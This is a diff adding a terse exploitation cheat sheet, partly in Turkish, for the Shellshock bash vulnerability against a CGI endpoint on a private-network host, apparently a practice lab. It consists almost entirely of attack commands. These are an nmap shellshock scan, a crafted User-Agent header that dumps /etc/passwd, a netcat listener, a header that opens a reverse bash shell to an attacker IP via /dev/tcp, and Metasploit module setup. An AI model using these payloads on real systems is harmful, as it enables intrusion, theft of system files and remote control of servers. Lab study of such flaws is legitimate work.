@@ -1,0 +1,17 @@
+192.168.100.55/gettime.cgi
+nmap -sV 192.168.100.55 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
+
+burpsuite foxyproxy ac baglanti yakala send repeater
+User-Agent: () { :; } ; echo; echo; /bin/bash -c 'cat /etc/passwd'
+
+nc -nlvp 1234
+
+User-Agent: () { :; } ; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.168.100.5/1234'
+
+
+msfconsole -q
+
+search shellshock
+
+exploit/multi/http/apache_mod_cgi_bash_env_exec
+set TARGET /gettime.cgi
